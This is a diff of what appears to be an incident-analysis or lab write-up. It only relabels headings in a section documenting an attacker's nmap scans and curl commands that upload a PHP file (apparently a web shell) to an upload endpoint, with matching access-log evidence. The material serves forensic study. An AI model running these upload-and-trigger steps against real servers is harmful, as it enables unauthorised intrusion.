@@ -36,7 +36,7 @@ nmap -sV -p 1-1000 10.0.0.20
 nmap -sV -p 80,443 10.0.0.20
 ```
 
-### 📄 Evidence (Apache access logs)
+### 📄 Evidence (Web access logs)
 
     10.0.0.50 - - [23/Nov/2025:14:01:09 +0200] "GET / HTTP/1.1" 200 512 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; http-enum)"
     10.0.0.50 - - [23/Nov/2025:14:01:09 +0200] "GET /robots.txt HTTP/1.1" 404 298 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; http-enum)"
@@ -48,14 +48,14 @@ nmap -sV -p 80,443 10.0.0.20
 
 The attacker probed the upload functionality:
 
-``` bash
+``` CMD
 curl -I http://10.0.0.20/
 curl http://10.0.0.20/upload.php
 curl -F 'file=@reverse_proxy.php' http://10.0.0.20/upload.php
 curl http://10.0.0.20/uploads/reverse_proxy.php?check=1
 ```
 
-### 📄 Evidence (Apache access logs)
+### 📄 Evidence (Web_access.logs)
 
     10.0.0.50 - - [23/Nov/2025:14:01:35 +0200] "GET /upload.php HTTP/1.1" 200 1337 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
     10.0.0.50 - - [23/Nov/2025:14:02:01 +0200] "POST /upload.php HTTP/1.1" 200 1542 "http://10.0.0.20/upload.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
